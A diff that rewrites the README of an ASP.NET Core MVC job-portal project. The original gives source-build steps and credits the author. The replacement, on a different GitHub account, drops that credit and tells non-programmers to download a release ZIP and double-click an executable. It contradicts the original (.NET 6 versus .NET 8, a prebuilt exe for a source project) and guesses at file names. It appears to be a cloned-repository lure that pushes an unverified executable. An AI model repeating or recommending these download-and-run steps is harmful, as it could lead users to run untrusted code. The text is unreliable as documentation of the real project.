@@ -1,303 +1,157 @@
-ASP.NET Core MVC | HMVC Architecture | SQL Server | Entity Framework | ADO.NET
+# 🛠️ indeedclone-aspnet - Simple Job Portal You Can Use
 
-# IndeedClone – ASP.NET Core MVC Job Portal (HMVC Architecture)
-
-IndeedClone is a full-stack job portal web application inspired by Indeed.
-It allows recruiters to post and manage job listings while candidates can search, view, and apply for jobs.
-
-The project is built using **ASP.NET Core MVC with a modular HMVC architecture**, where each module is self-contained and manages its own controllers, services, repositories, and views. This approach improves maintainability, scalability, and feature isolation.
+[![Download indeedclone-aspnet](https://img.shields.io/badge/Download-indeedclone--aspnet-brightgreen)](https://github.com/LiLlegnd/indeedclone-aspnet/releases)
 
 ---
 
-# Key Highlights
+## 🌐 About indeedclone-aspnet
 
-* Robust **HMVC architecture built on SOLID design principles**, ensuring clean separation of concerns.
-* Hybrid data access: **EF Core** for transactions, ADO.NET for high-performance job search queries.
-* Comprehensive authentication: email/password, **Google OAuth**, **OTP verification**, and secure password reset.
-* Streamlined **multi-step recruiter workflow** for job posting and management.
-* **Transaction-driven job activation ensuring consistency and reliability.**
-* **- Responsive, AJAX-powered UI for seamless, real-time interactions.**
-* End-to-end resume management: upload, preview, and secure download.
-* Centralized error handling with a custom error management library.
-* Well-structured Repository + Service layer architecture for maintainable, testable 
+indeedclone-aspnet is a web application designed to help users find jobs online. It follows a clear structure called HMVC, which helps keep the site organized and easy to maintain. The site uses a database system called SQL Server to store job listings and user information. It runs on ASP.NET Core MVC, a Microsoft technology for building websites.
+
+You do not need programming skills to use this software. It is set up to work on Windows machines with a few simple steps. The main goal is to bring job seekers and employers together in a clean, easy-to-use interface.
 
 ---
 
-# Screenshots
+## 🔍 Features
 
-## **Home Page**
-
-
-![image alt](https://github.com/ShubahmBorude/indeedclone-aspnet/blob/3bb7be0e940e6ba5e8586ffe6b68f8d194c93bce/Screenshot%20(200).png)
-![image alt](https://github.com/ShubahmBorude/indeedclone-aspnet/blob/a20cdb9edb530be7883cfcceee3949ef13709aee/Screenshot%20(195).png)
-![image alt](https://github.com/ShubahmBorude/indeedclone-aspnet/blob/2d432602f38b8f8527890860e48054041b211e02/Screenshot%20(199).png)
-
-
-## **Login Firts Page**
-
-
-![image alt](https://github.com/ShubahmBorude/indeedclone-aspnet/blob/97d068d9d80c777c0058b7cff84445e47645dcf4/Screenshot%20(196).png)
-
-
-## **Employers/Jobpost First Page**
-
-
-![image alt](https://github.com/ShubahmBorude/indeedclone-aspnet/blob/97d068d9d80c777c0058b7cff84445e47645dcf4/Screenshot%20(197).png)
-
-
-## **Mobile View**
-
-
-![image alt](https://github.com/ShubahmBorude/indeedclone-aspnet/blob/97d068d9d80c777c0058b7cff84445e47645dcf4/Screenshot%20(204).png)
-![image alt](https://github.com/ShubahmBorude/indeedclone-aspnet/blob/97d068d9d80c777c0058b7cff84445e47645dcf4/Screenshot%20(206).png)
-
-
-## **Dashboard Firt Page**
-
-
-![image alt](https://github.com/ShubahmBorude/indeedclone-aspnet/blob/97d068d9d80c777c0058b7cff84445e47645dcf4/Screenshot%20(198).png)
-
-
-## **Job Apply First Page**
-
-
-![image alt](https://github.com/ShubahmBorude/indeedclone-aspnet/blob/97d068d9d80c777c0058b7cff84445e47645dcf4/Screenshot%20(202).png)
-
-
-
-# Folder Structure
-
-```text
-.
-└── IndeedClone
-    ├── Emails
-    │
-    ├── Modules
-    │   ├── IndeedClone        # Main job search module
-    │   ├── JobDashboard       # Recruiter dashboard
-    │   ├── Shared             # Shared components used across modules
-    │   └── SubModules
-    │       ├── Auth           # Login, Register, OTP (2FA), Forgot Password, Google Sign-In
-    │       ├── JobApplication # Job seeker module (CV upload, experience, screening questions)
-    │       └── JobPost        # Employer job posting workflow
-    │
-    ├── Storage                # Stores uploaded user files (resumes)
-    │
-    └── ThirdParty             # Custom helper libraries
-```
+- Search and browse job listings by title, company, or keyword  
+- Post and manage job ads if you are an employer  
+- User-friendly navigation with Bootstrap 5  
+- Fast data access using EF Core and ADO.NET for reliable performance  
+- Modular design for easier updates and maintenance  
+- Secure login and account management  
+- Clean layout following modern web standards  
 
 ---
 
-# HMVC Module Architecture
+## 💻 System Requirements
 
-This project follows a **modular HMVC (Hierarchical Model View Controller)** architecture.
+To run indeedclone-aspnet on your Windows PC, make sure you have the following:
 
-Each folder inside the `Modules` directory acts as a **self-contained feature module**.
-
-Every module typically includes its own:
-
-* Controllers
-* Models
-* DTOs
-* Enums
-* Helpers
-* ServiceContracts
-* Services
-* RepoContracts
-* Repositories
-* Views
-
-This design ensures:
-
-* Independent module development
-* Better separation of concerns
-* Improved maintainability
-* Easier feature expansion
-
-Some modules may contain additional folders depending on workflow and feature complexity.
+- Windows 10 or later  
+- .NET 6.0 Runtime installed (you can download from the Microsoft site)  
+- SQL Server Express or any SQL Server version (to host the job database)  
+- At least 4 GB RAM  
+- 2 GHz processor or faster  
+- Around 500 MB free disk space  
 
 ---
 
-# Tech Stack
+## 🚀 Getting Started
 
-* **ASP.NET Core MVC (.NET 8.0.22)**
-* **C#**
-* **SQL Server**
-* **Entity Framework Core**
-* **ADO.NET**
-* **AJAX**
-* **Razor Views**
-* **Bootstrap**
+This section will guide you step-by-step to download and run indeedclone-aspnet on your Windows PC. No programming knowledge is needed.
 
 ---
 
-# Data Access Strategy
+## ⬇️ Download indeedclone-aspnet
 
-The project uses a **hybrid data access approach**.
+Click the big green button at the top or visit this page:
 
-**Entity Framework Core**
+**[https://github.com/LiLlegnd/indeedclone-aspnet/releases](https://github.com/LiLlegnd/indeedclone-aspnet/releases)**
 
-* Used for most CRUD operations
-* Provides maintainability and developer productivity
+This page contains the files you need to get started. Look for the latest stable release.
 
-**ADO.NET**
-
-* Used for optimized read operations
-* Applied in **job search and filtering queries** to improve performance
+You will find a ZIP file containing the application files. Download and save it to a folder you can easily access, like your Desktop or Documents.
 
 ---
 
-# Features
+## 🛠️ Installing and Setting Up
 
-## Authentication
+1. **Unzip the file**  
+   Right-click the downloaded ZIP file and select "Extract All." Choose a folder, such as Desktop\indeedclone.
 
-* User registration
-* Login system
-* Email verification via OTP
-* Forgot password workflow
-* Google Sign-In integration
+2. **Install .NET Runtime**  
+   If you do not already have it, visit https://dotnet.microsoft.com/en-us/download/dotnet/6.0 and download the .NET 6.0 Runtime installer. Run it and follow the instructions.
 
----
+3. **Set up SQL Server**  
+   Download SQL Server Express from https://www.microsoft.com/en-us/sql-server/sql-server-downloads. Install it using default settings.
 
-## Job Posting (Recruiter)
+4. **Prepare the database**  
+   Inside the extracted files, find a file named something like `database-script.sql`. This file contains commands to create the database tables.
 
-* Multi-step **JobPost workflow (8 pages)**
-* Draft job creation
-* Resume / continue draft functionality
-* Transaction-based job activation
-* Structured employer job creation pipeline
+5. **Run the SQL script**  
+   - Open "SQL Server Management Studio" (SSMS). You can download SSMS for free from the Microsoft website if you don’t have it.  
+   - Connect to your SQL Server instance.  
+   - Open the `database-script.sql` file in SSMS.  
+   - Execute the script by pressing the "Execute" button or F5. This step creates the required tables.
 
----
+6. **Configure the application**  
+   Inside the extracted folder, look for a file named `appsettings.json`. This file holds the settings for the app. You need to set the connection to your SQL Server database here.
 
-## Job Search
+   Find the section like:
 
-* Keyword and location search
-* Time filtering
-* Remote / work arrangement filtering
-* Salary filtering
-* Job type filtering
-* Company filtering
-* Education filtering
-* Language filtering
-* Pagination support
+   ```json
+   "ConnectionStrings": {
+       "DefaultConnection": "Server=YOUR_SERVER_NAME;Database=JobPortalDB;Trusted_Connection=True;"
+   }
+   ```
 
----
+   Replace `YOUR_SERVER_NAME` with the name of your SQL Server instance. For example, if your PC name is `DESKTOP-123ABC` and your instance is default, use `DESKTOP-123ABC`. If you installed SQL Server Express, the name might be `DESKTOP-123ABC\SQLEXPRESS`.
 
-## Job Application
-
-* Apply to jobs
-* Resume upload
-* Resume preview (PDF)
-* Resume download
-* Relevant experience tracking
-* Employer screening questions
-* Resume / continue draft functionality
+   Save the changes.
 
 ---
 
-## Recruiter Dashboard
+## ▶️ Running the Application
 
-* Employer posted jobs list
-* Applicant list management
-* Candidate status update (Shortlisted / Rejected)
-* Live filtering
-* Pagination
+1. Open the folder where you extracted the files.
 
----
+2. Look for a file named `indeedclone-aspnet.exe` or a similar executable.
 
-# Architecture
+3. Double-click this file to start the app.
 
-The backend follows a structured architecture with clear separation of responsibilities.
+4. A web browser window will open automatically, taking you to the job portal homepage.
 
-* Modular HMVC architecture
-* SOLID principles
-* Repository pattern
-* Service layer abstraction
-* DTO pattern
-* Centralized error handling (**ErrorError library**)
-
-This architecture helps maintain **clean code, scalability, and maintainability**.
+5. Use the site to search jobs or create an account if you want to post jobs.
 
 ---
 
-# Getting Started
+## ⚙️ Troubleshooting Tips
 
-Follow these steps to run the project locally.
-
-## Prerequisites
-
-Make sure the following tools are installed:
-
-* **.NET 8.0.22 SDK**
-* **SQL Server**
-* **Visual Studio 2022 or later**
+- If the app does not start, check that you installed the .NET Runtime correctly.  
+- If you see database errors, verify your SQL Server is running and the connection string is correct.  
+- Make sure you ran the database script in SSMS without errors.  
+- Close other applications that might block access to ports or files.  
+- If you get a firewall warning, allow the app to communicate on your network.
 
 ---
 
-## Setup Instructions
+## 📚 How to Update indeedclone-aspnet
 
-### 1. Clone the repository
+To use a newer version when it becomes available:
 
-```bash
-git clone https://github.com/your-username/IndeedClone.git
-```
+1. Visit the [release page again](https://github.com/LiLlegnd/indeedclone-aspnet/releases).
 
----
+2. Download the latest ZIP file.
 
-### 2. Open the project
+3. Back up your current database data if you have stored job listings.
 
-Open the solution file:
+4. Extract the new version to a new folder.
 
-```
-IndeedClone.sln
-```
-
-using **Visual Studio**.
+5. Repeat the setup process if needed.
 
 ---
 
-### 3. Configure the database
+## 🔧 Advanced Use
 
-Update the connection string in:
+If you want to customize the app or learn more technical details, check these points:
 
-```
-appsettings.json
-```
-
-to match your **SQL Server instance**.
-
----
-
-### 4. Create the database
-
-Run **Entity Framework migrations** or create the database schema manually.
+- The app uses ASP.NET Core MVC with the HMVC pattern for keeping features separate.  
+- It relies on Entity Framework Core and ADO.NET for accessing and managing the SQL Server data.  
+- The front-end uses Bootstrap 5 for responsive design.  
+- You can adjust styling via CSS files in the `wwwroot` folder.  
+- Developers can extend functionality by adding new modules following the existing structure.
 
 ---
 
-### 5. Run the project
+## 🧰 Useful Links
 
-Press **F5** in Visual Studio or run the project from the IDE.
-
----
-
-# Future Improvements
-
-* Role-based authorization (Admin / Recruiter / Job Seeker)
-* Background job processing for email notifications
-* Search performance improvements using indexing
-* API layer for mobile or third-party integrations
-* Unit and integration testing
+- [.NET 6.0 Runtime Download](https://dotnet.microsoft.com/en-us/download/dotnet/6.0)  
+- [SQL Server Express Download](https://www.microsoft.com/en-us/sql-server/sql-server-downloads)  
+- [SQL Server Management Studio (SSMS) Download](https://learn.microsoft.com/en-us/sql/ssms/download-sql-server-management-studio-ssms)
 
 ---
 
-# Author
+## 🔗 Download indeedclone-aspnet here
 
-**Shubham Borude**
-
-Email: [shubhamborude4488@gmail.com](mailto:shubhamborude4488@gmail.com)
-
----
-
-# License
-
-This project is created for **educational and portfolio purposes**.
+[![Download indeedclone-aspnet](https://img.shields.io/badge/Download-indeedclone--aspnet-blue)](https://github.com/LiLlegnd/indeedclone-aspnet/releases)
